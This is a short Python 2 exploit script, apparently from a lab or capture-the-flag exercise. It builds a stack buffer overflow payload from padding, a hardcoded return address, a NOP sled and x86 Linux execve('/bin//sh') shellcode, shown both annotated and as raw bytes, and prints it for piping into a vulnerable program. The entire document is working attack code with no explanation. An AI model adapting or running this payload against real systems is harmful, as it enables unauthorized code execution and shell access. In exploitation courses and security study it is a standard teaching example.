padding = 'A' * 24
eip = '\x80\xf5\xff\xbf'
nopsled = '\x90' * 300

#shellcode = (
#"\x31\xc0"+ #/* Line 1: xorl %eax,%eax */
#"\x50"+ #/* Line 2: pushl %eax */
#"\x68"+"//sh"+ #/* Line 3: pushl $0x68732f2f */
#"\x68"+"/bin"+ #/* Line 4: pushl $0x6e69622f */
#"\x89\xe3"+ #/* Line 5: movl %esp,%ebx */
#"\x50"+ #/* Line 6: pushl %eax */
#"\x53"+ #/* Line 7: pushl %ebx */
#"\x89\xe1"+ #/* Line 8: movl %esp,%ecx */
#"\x99"+ #/* Line 9: cdq */
#"\xb0\x0b"+ #/* Line 10: movb $0x0b,%al */
#"\xcd\x80" #/* Line 11: int $0x80 */
#)

shellcode = (
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"+
"\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
)

print padding + eip + nopsled + shellcode
